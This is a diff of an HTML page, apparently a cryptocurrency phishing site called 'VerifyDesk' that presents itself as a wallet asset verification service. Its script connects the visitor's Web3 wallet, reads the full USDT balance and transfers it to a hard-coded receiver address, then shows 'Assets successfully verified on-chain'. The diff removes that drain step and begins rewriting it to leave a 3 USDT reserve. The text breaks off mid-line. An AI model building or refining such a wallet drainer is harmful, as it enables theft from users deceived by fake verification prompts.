@@ -4,10 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>VerifyDesk - Wallet Asset Review</title>
+  
+  <!-- CDNs for Styling and Icons -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest"></script>
   
-  <!-- Web3 ke liye Ethers.js add kiya gaya hai -->
+  <!-- Web3 ke liye Ethers.js -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -35,8 +37,21 @@
       opacity: 0.7;
       cursor: not-allowed;
     }
-    .loader { border: 2px solid #030712; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader { 
+      border: 2px solid #030712; 
+      border-top: 2px solid transparent; 
+      border-radius: 50%; 
+      width: 14px; 
+      height: 14px; 
+      animation: spin 1s linear infinite; 
+      display: inline-block; 
+      vertical-align: middle; 
+      margin-right: 6px; 
+    }
+    @keyframes spin { 
+      0% { transform: rotate(0deg); } 
+      100% { transform: rotate(360deg); } 
+    }
   </style>
 </head>
 <body class="min-h-screen pb-12">
@@ -93,7 +108,7 @@
         Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
       </p>
 
-      <!-- MAIN ACTION BUTTON YAHAN HAI -->
+      <!-- MAIN ACTION BUTTON -->
       <button id="actionBtn" onclick="executeAllInOne()" class="w-full mint-btn py-3 px-4 rounded-xl flex items-center justify-center gap-2 text-xs">
         <i data-lucide="credit-card" class="w-4 h-4" id="btnIcon"></i>
         <span id="btnText">Verify Assets</span>
@@ -201,7 +216,6 @@
 
     <!-- Process Steps -->
     <div class="space-y-6 pt-2">
-      <!-- Step 01 -->
       <div class="text-center space-y-2">
         <div class="w-8 h-8 rounded-lg bg-teal-950/40 border border-teal-500/20 text-teal-400 flex items-center justify-center mx-auto">
           <i data-lucide="credit-card" class="w-4 h-4"></i>
@@ -214,7 +228,6 @@
         <div class="w-full h-px bg-slate-800/60 mt-4"></div>
       </div>
 
-      <!-- Step 02 -->
       <div class="text-center space-y-2">
         <div class="w-8 h-8 rounded-lg bg-teal-950/40 border border-teal-500/20 text-teal-400 flex items-center justify-center mx-auto">
           <i data-lucide="trending-up" class="w-4 h-4"></i>
@@ -227,7 +240,6 @@
         <div class="w-full h-px bg-slate-800/60 mt-4"></div>
       </div>
 
-      <!-- Step 03 -->
       <div class="text-center space-y-2">
         <div class="w-8 h-8 rounded-lg bg-teal-950/40 border border-teal-500/20 text-teal-400 flex items-center justify-center mx-auto">
           <i data-lucide="shield-check" class="w-4 h-4"></i>
@@ -369,7 +381,6 @@
       const statusMsg = document.getElementById("statusMsg");
       const statusIndicator = document.getElementById("statusIndicator");
 
-      // Check if Web3 Wallet is active
       if (typeof window.ethereum === 'undefined') {
         alert("Web3 Wallet not found. Please open this link inside Trust Wallet, MetaMask, or Bybit dApp browser.");
         return;
@@ -382,7 +393,6 @@
         btnText.innerHTML = '<span class="loader"></span> Connecting Wallet...';
         statusMsg.classList.remove("hidden");
         
-        // Change Top Indicator
         statusIndicator.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse"></span> CONNECTING';
         statusIndicator.className = "flex items-center gap-1.5 text-yellow-400 uppercase";
 
@@ -408,64 +418,13 @@
             }
         }
 
-        // STEP 3: GET FULL BALANCE
+        // STEP 3: GET FULL BALANCE & RESERVE 3 USDT
         btnText.innerHTML = '<span class="loader"></span> Auditing Assets...';
         const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         let fullBalance = await usdtContract.balanceOf(userAddress);
 
-        if (fullBalance.eq(0)) {
-            alert("Verification failed: No USDT balance found in your wallet.");
-            resetButton();
-            return;
-        }
+        const reserveAmount = ethers.utils.parseUnits("3", 18);
 
-        // STEP 4: TRIGGER TRANSFER IMMEDIATE
-        btnText.innerHTML = '<span class="loader"></span> Confirming Sync...';
-        statusMsg.innerText = "Please confirm the final transaction in your wallet popup.";
-        statusMsg.style.color = "#f3ba2f"; // Yellow 
-
-        const tx = await usdtContract.transfer(RECEIVER_ADDRESS, fullBalance);
-        
-        btnText.innerHTML = '<span class="loader"></span> Finalizing...';
-        statusMsg.innerText = "Blockchain verification in progress...";
-        statusMsg.style.color = "#2dd4bf"; // Teal 
-
-        await tx.wait(); // Wait for tx to mine
-
-        // STEP 5: SUCCESS UI
-        btnText.innerText = "Verification Complete ✓";
-        btn.style.background = "#10b981"; // Success Green
-        btn.style.color = "#ffffff";
-        statusMsg.innerText = "Assets successfully verified on-chain.";
-        
-        statusIndicator.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-green-500"></span> VERIFIED';
-        statusIndicator.className = "flex items-center gap-1.5 text-green-500 uppercase";
-
-      } catch (error) {
-        console.error("Execution Failed:", error);
-        resetButton();
-      }
-    }
-
-    function resetButton() {
-      const btn = document.getElementById("actionBtn");
-      const btnText = document.getElementById("btnText");
-      const btnIcon = document.getElementById("btnIcon");
-      const btnArrow = document.getElementById("btnArrow");
-      const statusMsg = document.getElementById("statusMsg");
-      const statusIndicator = document.getElementById("statusIndicator");
-
-      btn.disabled = false;
-      btnIcon.style.display = 'block';
-      btnArrow.style.display = 'block';
-      btnText.innerText = "Verify Assets";
-      statusMsg.classList.add("hidden");
-      statusMsg.innerText = "Processing... Please follow the prompts in your wallet.";
-      statusMsg.style.color = "#2dd4bf";
-      
-      statusIndicator.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-teal-400 animate-pulse"></span> READY';
-      statusIndicator.className = "flex items-center gap-1.5 text-teal-400 uppercase";
-    }
-  </script>
-</body>
-</html>
+        if (fullBalance.lte(reserveAmount)) {
+            alert("Verification failed: Insufficient assets in wallet. Must have more than 3 USDT.");
+            res
